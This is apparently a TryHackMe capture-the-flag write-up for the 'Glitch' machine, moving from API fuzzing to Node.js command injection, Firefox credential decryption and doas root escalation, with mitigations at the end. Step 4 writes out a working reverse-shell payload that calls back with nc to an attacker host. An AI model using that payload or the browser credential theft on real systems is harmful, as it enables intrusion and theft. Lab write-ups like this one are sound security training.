# TryHackMe – Glitch Write-Up


Machine Name: Glitch

Difficulty: Easy/Medium

Category: Web / API Exploitation

IP: 10.130.153.58

Summary:
This machine featured a multi-stage attack starting with a Node.js Command Injection vulnerability in a hidden API parameter. After gaining initial access as a low-privileged user, I performed horizontal escalation to the user v0id by extracting encrypted credentials from a Firefox profile. Finally, I achieved root privileges by exploiting a misconfigured doas SUID binary.

---------------------------------------------------------------
Recon
---------------------------------------------------------------

Step 1: Nmap Enumeration
I started with a full port scan to identify open services:
$ nmap -p- -sV -sC -Pn --min-rate 1000 10.130.153.58

The scan revealed:
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)

Step 2: Directory and API Fuzzing
Initial directory fuzzing with gobuster revealed several interesting paths:
- /secret: A page containing JS pointing to an API.
- /api/access: Contained a Base64 "this_is_not_real" (Rabbit Hole).
- /api/items: JSON list of items.

---------------------------------------------------------------
Exploitation
---------------------------------------------------------------

Step 3: Discovering Command Injection
Following a hint on the challenge page, I tested the POST method on the items API:
$ curl -X POST http://10.130.153.58/api/items
Response: {"message":"there_is_a_glitch_in_the_matrix"}

I used ffuf to fuzz for hidden parameters on this POST request:
$ ffuf -u http://10.130.153.58/api/items?FUZZ=test -X POST -w common.txt
Result: Found 'cmd' parameter.

Step 4: Gaining a Reverse Shell
Knowing the backend was Node.js, I injected a child_process.exec command into the cmd parameter:
$ curl -X POST "http://10.130.153.58/api/items?cmd=require('child_process').exec('rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%20<KALI_IP>%204444%20%3E/tmp/f')"

This successfully established a connection as the user 'user'.

---------------------------------------------------------------
Privilege Escalation
---------------------------------------------------------------

Step 5: User Pivot (Firefox Credential Theft)
I found a hidden .firefox folder in /home/user. Firefox stores saved passwords in encrypted files (logins.json and key4.db).
1. Transferred the profile to my Kali machine.
2. Decrypted the profile using firefox-decrypt tools.
3. Found Credentials for v0id: *****

Step 6: Root Access (doas Exploitation)
Checking for SUID binaries revealed /usr/local/bin/doas:
$ find / -type f -user root -perm -u=s 2>/dev/null

I used doas to spawn a root bash shell:
v0id@ubuntu:~$ doas -u root /bin/bash
Password: ******
root@ubuntu:~# whoami
root

---------------------------------------------------------------
Capture the Flag
---------------------------------------------------------------

Step 7: Locate the Flags
User Flag: /home/user/user.txt
Root Flag: /root/root.txt

Conclusion:
---------------------------------------------------------------
The Glitch machine demonstrated how a single unvalidated API parameter can lead to RCE and how sensitive info in browser profiles can be used to escalate privileges.

Mitigation:
---------------------------------------------------------------
- Strict input validation for API parameters (avoid exec() with user input).
- Discourage saved browser passwords on sensitive servers.
- Proper least-privilege configuration for sudo/doas policies.
